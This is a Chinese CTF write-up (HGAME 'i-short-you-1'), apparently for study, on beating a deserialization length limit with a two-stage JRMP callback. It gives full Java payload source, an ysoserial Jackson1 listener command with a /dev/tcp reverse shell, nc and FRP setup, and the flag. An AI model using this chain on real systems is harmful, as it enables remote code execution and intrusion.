# i-short-you-1

## 题目简述

题目提供了一个 Java 原生反序列化入口，但对提交的 Base64 字符串有长度限制。常见的完整 gadget chain 很难直接塞进限制内，因此需要先提交一个很短的 JRMP 客户端对象，让靶机在反序列化时回连攻击端；攻击端再通过 JRMP 返回真正的 Jackson1 gadget，形成两阶段反序列化并执行反弹 shell。

## 解题过程

### 用 JRMP 拆分两阶段载荷

核心思路不是继续压缩完整的 Jackson1 链，而是把第一次载荷压缩为一个指向攻击机的 RMI 远程引用：

1. 靶机反序列化短小的 `RemoteObjectInvocationHandler`/`UnicastRef` 对象；
2. `LiveRef` 中记录的地址促使靶机向攻击端 JRMP 监听器发起通信；
3. JRMP 监听器把第二阶段 Jackson1 gadget 作为返回对象发给靶机；
4. 靶机再次反序列化返回对象，执行其中的命令。

这样，受长度限制的 HTTP 参数只承载第一阶段远程引用，体积较大的真正利用链通过 JRMP 连接传输。

### 生成短 JRMP 客户端对象

官方题解给出的完整生成代码如下。把 `vps-ip` 和端口改成靶机能够访问的地址；若只想生成提交用 Base64，应注释最后一行本地 `readObject()`，否则生成端自己也会立即连接 JRMP 监听器并反序列化其返回对象。

```java
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Base64;

public class POC {
    public static void main(String[] args) throws Exception {
        ObjID id = new ObjID();
        TCPEndpoint endpoint = new TCPEndpoint("vps-ip", 8080);
        LiveRef liveRef = new LiveRef(id, endpoint, false);
        UnicastRef ref = new UnicastRef(liveRef);
        RemoteObjectInvocationHandler obj =
            new RemoteObjectInvocationHandler(ref);

        ByteArrayOutputStream output = new ByteArrayOutputStream();
        ObjectOutputStream objectOutput = new ObjectOutputStream(output);
        objectOutput.writeObject(obj);
        objectOutput.close();

        byte[] serialized = output.toByteArray();
        String payload = Base64.getEncoder().encodeToString(serialized);
        System.out.println(payload);
        System.out.println("length: " + payload.length());

        // 仅用于本地验证；生成远程提交载荷时应注释这一行。
        new ObjectInputStream(
            new ByteArrayInputStream(serialized)
        ).readObject();
    }
}
```

代码使用 `sun.rmi.*` 内部类，最省事的做法是使用与题目接近的 JDK 8 编译运行。若必须使用较新的 JDK，需要额外处理模块导出与反射开放问题，生成环境也必须包含相应依赖。

序列化结果会包含主机名字符串，所以地址本身也会影响长度。官方提示在环境支持的情况下可尝试更短的 IPv4 数字/十六进制表示；无论采用何种写法，都应先确认 Java 能把它解析到正确的公网地址，不能只看字符数。

### 启动第二阶段与反弹监听

攻击机先在 7777 端口等待反弹 shell：

```bash
nc -lvnp 7777
```

再使用 ysoserial 的 JRMP 监听器，在 8080 端口向回连的靶机发送 Jackson1 gadget：

```bash
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar \
  ysoserial.exploit.JRMPListener 8080 Jackson1 \
  'bash -i >& /dev/tcp/<attacker-ip>/7777 0>&1'
```

如果 ysoserial 及其依赖只在本地可运行，而公网 VPS 只负责接收连接，可以用 FRP 把 VPS 的 JRMP 端口转发回本地。例如公网端：

```ini
[common]
bind_port = 7000
```

本地端：

```ini
[common]
server_addr = <vps-ip>
server_port = 7000

[JRMP]
type = tcp
local_ip = 127.0.0.1
local_port = 8080
remote_port = 8080
```

最后将 POC 输出的 Base64 作为题目的 `payload` 参数提交。Base64 中的 `+`、`/`、`=` 必须进行 URL 编码；用 `curl --data-urlencode` 可以避免手工转义错误：

```bash
curl -G 'http://<target>/backdoor' \
  --data-urlencode 'payload=<base64-payload>'
```

JRMP 回连成功后，7777 端口收到靶机 shell。读取 `/flag` 得到：

```text
hgame{2c52636c01c57e893e71484c851c6aca0604f081}
```

官方 PDF 给出了短客户端 POC、`JRMPListener + Jackson1` 命令及成功 shell，但结果截图没有打印 flag；[参赛者复盘](https://zer0peach.github.io/2024/02/24/HGAME-week4/)补充了 JRMP 两阶段原理、端口转发部署方式和最终结果，正文已吸收这些关键信息。

## 方法总结

- 面对反序列化载荷长度限制，可以把短远程引用作为第一阶段，把完整 gadget 放到协议回连的第二阶段传输。
- `JRMPClient` 与 `JRMPListener` 的角色不能颠倒：靶机反序列化客户端引用后主动连接攻击端，监听器再返回恶意对象。
- 地址字符串也是序列化数据的一部分；缩短地址能继续压缩载荷，但必须验证目标 JDK 对该地址表示的解析结果。
- 生成 POC 中的本地 `readObject()` 只用于验证，实际生成载荷时应移除，以免攻击自己的生成环境或提前消费监听器返回。
- 提交 Base64 时必须进行 URL 编码，否则 `+` 常被表单解析为空格，导致反序列化前就已损坏。
